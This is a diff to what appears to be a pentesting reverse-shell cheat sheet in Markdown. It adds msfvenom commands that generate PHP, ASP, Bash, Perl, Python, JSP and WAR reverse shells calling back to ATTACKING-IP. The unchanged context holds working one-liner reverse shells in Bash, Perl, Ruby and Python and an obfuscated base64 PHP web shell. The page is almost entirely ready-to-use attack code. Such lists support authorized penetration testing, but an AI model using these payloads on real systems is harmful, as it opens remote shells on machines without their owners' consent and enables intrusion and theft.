@@ -94,9 +94,29 @@ Base64 encoded PHP Shell by @0xInfection:
 <?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
 ```
 
+### MSFVenom PHP Reverse Shell 
+
+MSFVenom can be used to generate a PHP revsell using the following command: 
+
+{% highlight bash %}
+msfvenom -p php/meterpreter_reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.php
+{% endhighlight %}
+
 Another excellent PHP shell that I have personally used MANY times is the Pentest Monkey reverse shell that can be downloaded from their GitHub here: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
 
+## ASP Reverse Shell 
+
+MSFVenom can be leveraged to generate an ASP reverse shell. 
+
+How to generate an ASP Reverse Shell with MSFVenom: 
+
+{% highlight bash %}
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f asp > rev-shell.asp
+{% endhighlight %}
+
+
 ## Bash Reverse Shells
+
 {% highlight bash %}
 exec /bin/bash 0&0 2>&0
 {% endhighlight %}
@@ -116,6 +136,14 @@ while read line 0<&5; do $line 2>&5 >&5; done
 
 {% highlight bash %}
 bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
+{% endhighlight %}
+
+### MSFVenom Bash Reverse Shell
+
+MSFVenom can be used to generate a Bash revsell using the following command: 
+
+{% highlight bash %}
+msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.sh
 {% endhighlight %}
 
 ## socat Reverse Shell
@@ -197,6 +225,14 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 {% endhighlight %}
 
+### MSFVenom Perl Reverse Shell
+
+MSFVenom can be used to generate a Perl reverse sell using the following command: 
+
+{% highlight bash %}
+msfvenom -p cmd/unix/reverse_perl LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.pl
+{% endhighlight %}
+
 ## Ruby Reverse Shell
 {% highlight ruby %}
 ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@@ -214,6 +250,31 @@ p.waitFor()
 
 {% highlight python %}
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+{% endhighlight %}
+
+
+### MSFVenom Python Reverse Shell
+
+MSFVenom can be used to generate a Python reverse shell using the following command: 
+
+{% highlight bash %}
+msfvenom -p cmd/unix/reverse_python LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.py
+{% endhighlight %}
+
+## JSP Reverse Shell
+
+MSFVenom can be used to generate a JSP reverse shell using the following command: 
+
+{% highlight bash %}
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.jsp
+{% endhighlight %}
+
+## WAR Reverse Shell
+
+MSFVenom can be used to generate a WAR reverse shell using the following command: 
+
+{% highlight bash %}
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f war > reverse-shell.war
 {% endhighlight %}
 
 ## Gawk Reverse Shell
@@ -246,6 +307,9 @@ BEGIN {
         }
 }
 {% endhighlight %}
+
+
+
 
 ## Kali Web Shells
 
